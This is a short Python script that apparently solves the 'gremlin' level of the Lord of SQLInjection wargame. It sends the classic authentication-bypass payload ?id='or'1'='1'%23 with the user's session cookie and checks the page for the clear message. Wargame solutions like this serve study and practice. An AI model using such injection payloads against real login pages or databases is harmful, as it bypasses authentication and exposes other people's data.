#!/usr/bin/python
# coding: utf-8

from requests import get


url = "http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php"

# Set PHPSESSID by user input
session = input("Input your LOS session : ")
# session = "gequo9hff2f19sjmieftjnuf50"

headers = {
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'Accept-Encoding': 'gzip, deflate, br',
	'Accept-Language': 'ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4',
	'Cookie': 'PHPSESSID={0}'.format(session)
}

param = "?id='or'1'='1'%23"

r = get(url + param , headers=headers)

if r.text.find("<h2>GREMLIN Clear!</h2>") > 0:
    print("Gremlin Clear!")
